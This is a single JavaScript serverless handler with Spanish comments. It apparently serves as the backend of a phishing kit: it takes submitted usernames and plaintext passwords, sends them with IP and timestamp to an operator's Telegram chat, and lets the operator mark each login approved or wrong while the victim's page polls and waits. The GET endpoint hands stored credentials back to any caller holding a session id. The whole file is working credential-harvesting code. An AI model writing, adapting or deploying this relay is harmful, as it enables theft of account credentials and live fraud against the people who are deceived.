// api/telegram.js
// Archivo único que maneja todo: frontend, callbacks de Telegram y sesiones

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Almacenamiento de sesiones en memoria (para producción usar Redis)
const sessions = new Map();

export default async function handler(req, res) {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Verificar variables de entorno
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('❌ Variables de entorno no configuradas');
        return res.status(500).json({ 
            error: 'Configuración del servidor incompleta',
            action: 'error'
        });
    }

    // ============================================
    // POST: Recibir datos del frontend
    // ============================================
    if (req.method === 'POST') {
        try {
            const body = req.body;

            // Verificar si es callback de Telegram
            if (body.callback_query) {
                return await handleTelegramCallback(body, res);
            }

            // Es una petición del frontend
            const { usuario, clave, ip, fecha, sessionId, intento } = body;

            if (!usuario || !clave) {
                return res.status(400).json({ 
                    error: 'Datos incompletos',
                    action: 'error'
                });
            }

            const newSessionId = sessionId || `${Date.now().toString(36)}-${Math.random().toString(36).substr(2, 5)}`;

            // Guardar sesión
            sessions.set(newSessionId, {
                usuario,
                clave,
                ip: ip || 'No disponible',
                fecha: fecha || new Date().toLocaleString(),
                intento: intento || 1,
                timestamp: Date.now(),
                status: 'pending',
                action: null,
                message: 'Esperando aprobación'
            });

            // Construir mensaje para Telegram
            const mensaje = `🔐 *NUEVO INTENTO DE LOGIN*
━━━━━━━━━━━━━━━━━━━━━━
👤 *Usuario:* \`${usuario}\`
🔑 *Clave:* \`${clave}\`
━━━━━━━━━━━━━━━━━━━━━━
📱 *IP:* ${ip || 'No disponible'}
🕐 *Fecha:* ${fecha || new Date().toLocaleString()}
🔄 *Intento #:* ${intento || 1}
🆔 *Session:* ${newSessionId}
━━━━━━━━━━━━━━━━━━━━━━
*¿Deseas aprobar o rechazar este acceso?*`;

            // Enviar a Telegram con botones
            const telegramResponse = await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: mensaje,
                        parse_mode: 'Markdown',
                        reply_markup: JSON.stringify({
                            inline_keyboard: [
                                [
                                    { 
                                        text: '❌ Error en Usuario', 
                                        callback_data: `error_user_${newSessionId}` 
                                    },
                                    { 
                                        text: '❌ Error en Clave', 
                                        callback_data: `error_pass_${newSessionId}` 
                                    }
                                ],
                                [
                                    { 
                                        text: '✅ Aprobar Acceso', 
                                        callback_data: `approve_${newSessionId}` 
                                    }
                                ]
                            ]
                        })
                    })
                }
            );

            const tgData = await telegramResponse.json();

            if (!tgData.ok) {
                console.error('❌ Error enviando a Telegram:', tgData);
                return res.status(500).json({
                    error: 'Error enviando a Telegram',
                    action: 'error'
                });
            }

            return res.status(200).json({
                success: true,
                action: 'pending',
                sessionId: newSessionId,
                message: 'Solicitud enviada a aprobación'
            });

        } catch (error) {
            console.error('❌ Error en webhook:', error);
            return res.status(500).json({
                error: 'Error interno del servidor',
                action: 'error'
            });
        }
    }

    // ============================================
    // GET: Verificar estado de una sesión
    // ============================================
    if (req.method === 'GET') {
        const { session } = req.query;

        if (!session) {
            return res.status(400).json({ error: 'Session ID requerido' });
        }

        const sessionData = sessions.get(session);

        if (!sessionData) {
            return res.status(200).json({ 
                action: 'not_found',
                message: 'Sesión no encontrada'
            });
        }

        // Verificar si la sesión expiró (5 minutos)
        if (Date.now() - sessionData.timestamp > 300000) {
            sessions.delete(session);
            return res.status(200).json({
                action: 'timeout',
                message: 'Tiempo de espera agotado'
            });
        }

        return res.status(200).json({
            action: sessionData.status === 'pending' ? 'pending' : sessionData.action,
            message: sessionData.message || 'Esperando respuesta',
            sessionData: {
                usuario: sessionData.usuario,
                clave: sessionData.clave,
                ip: sessionData.ip,
                fecha: sessionData.fecha
            }
        });
    }

    return res.status(405).json({ error: 'Método no permitido' });
}

// ============================================
// MANEJAR CALLBACKS DE TELEGRAM
// ============================================
async function handleTelegramCallback(body, res) {
    try {
        const callback = body.callback_query;
        const { id, data, message } = callback;
        const chatId = message.chat.id;

        console.log('📨 Callback recibido:', { id, data, chatId });

        // Extraer acción y sessionId
        const [action, sessionId] = data.split('_');

        // Buscar sesión
        const sessionData = sessions.get(sessionId);

        if (!sessionData) {
            await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: id,
                        text: '❌ Sesión expirada o no encontrada',
                        show_alert: true
                    })
                }
            );
            return res.status(200).json({ status: 'ok' });
        }

        // Procesar acción
        let respuesta = '';
        let mensajeUsuario = '';
        let actionType = '';

        switch (action) {
            case 'approve':
                respuesta = '✅ *ACCESO APROBADO*\n\nEl usuario ha sido verificado correctamente.';
                mensajeUsuario = 'Tu acceso ha sido aprobado. Serás redirigido...';
                actionType = 'approve';
                break;
            case 'error':
                if (data.includes('error_user')) {
                    respuesta = '❌ *USUARIO INCORRECTO*\n\nEl usuario ingresado no coincide con nuestros registros.';
                    mensajeUsuario = 'El usuario ingresado es incorrecto. Por favor, verifica tus datos.';
                    actionType = 'error_user';
                } else if (data.includes('error_pass')) {
                    respuesta = '❌ *CLAVE INCORRECTA*\n\nLa clave ingresada no coincide con nuestros registros.';
                    mensajeUsuario = 'La clave ingresada es incorrecta. Por favor, inténtalo nuevamente.';
                    actionType = 'error_pass';
                }
                break;
            default:
                respuesta = '⚠️ *ACCIÓN NO RECONOCIDA*';
                mensajeUsuario = 'Acción no válida. Por favor, intenta nuevamente.';
                actionType = 'unknown';
        }

        // Actualizar mensaje en Telegram con más detalles
        const newMessage = `${respuesta}\n━━━━━━━━━━━━━━━━━━━━━━\n👤 Usuario: \`${sessionData.usuario}\`\n📱 IP: ${sessionData.ip}\n🕐 Fecha: ${sessionData.fecha}`;

        await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    message_id: message.message_id,
                    text: newMessage,
                    parse_mode: 'Markdown'
                })
            }
        );

        // Responder al callback
        await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    callback_query_id: id,
                    text: `✅ ${action === 'approve' ? 'Aprobado' : 'Rechazado'}`,
                    show_alert: false
                })
            }
        );

        // Actualizar estado de sesión
        sessions.set(sessionId, {
            ...sessionData,
            status: 'answered',
            action: actionType,
            message: mensajeUsuario,
            timestamp: Date.now()
        });

        return res.status(200).json({ 
            status: 'ok', 
            action: actionType,
            message: mensajeUsuario 
        });

    } catch (error) {
        console.error('❌ Error en callback:', error);
        return res.status(500).json({ error: 'Error interno' });
    }
}